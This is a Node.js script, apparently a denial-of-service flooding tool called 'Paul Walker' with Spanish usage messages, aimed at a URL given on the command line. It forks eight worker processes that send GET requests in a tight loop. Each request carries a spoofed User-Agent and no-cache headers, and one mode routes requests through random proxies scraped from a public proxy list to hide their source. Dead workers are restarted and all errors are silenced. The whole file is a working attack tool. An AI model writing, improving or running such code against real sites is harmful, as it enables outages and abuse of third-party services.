const axios = require('axios')
const fakeUa = require('fake-useragent')
const cluster = require('cluster')
const HttpsProxyAgent = require('https-proxy-agent')

async function maintenance() {
  if (process.argv.length !== 4){
    console.log('_____________________________________')
    console.log('Uso: node paulwalker.js url raw/proxy')
    console.log('_____________________________________')
    process.exit()
  }
  
  
  else{
    if (process.argv[3] == 'raw'){
      console.log('Paul Walker raw')
    }
    else if(process.argv[3] == 'proxy'){
      const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
      console.log('Paul Walker proxy ')
    }
    else{
      console.log('proxy/raw')
      process.exit()
    }
    function run(){
    if (process.argv[3] == 'raw'){
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }
      axios(config).then(function (re){
        console.log("[Paul Walker Raw]—>responde",re.status)
      }).catch(function (error){
        console.log("[Paul Walker Raw]—> ",error.response.status)
      })
    }
    else if(process.argv[3] == 'proxy'){
      let proxy = proxies[Math.floor(Math.random() * proxies.length)];
      var agent = new HttpsProxyAgent('http://' + proxy);
      var cung={
        url:process.argv[2],
        httpsAgent: agent,
        medthod:'get',
        headers:{
           'Cache-Control': 'no-cache',
           'User-Agent': fakeUa()
          
        }
      }
      axios(cung).then(function (res){
        console.log("[Paul Walker proxy]—>",res.status)
      }).catch(function (error){
        console.log("[Paul Walker proxy]—> ",error.response.status)
      })
    }
    
  }
  
  // body...
}


function time(){
  setInterval(()=>{
    run()
  })
}

async function th(){
  if (cluster.isMaster){
    for (let u=0;u<8;u++){
      cluster.fork()
      console.log('Creado por Jorge Khe Mamadas')
    }
    cluster.on('exit',function(){
      cluster.fork()
    })
  }
  else{
    time()
  }
  
}
th()




}






process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
maintenance()
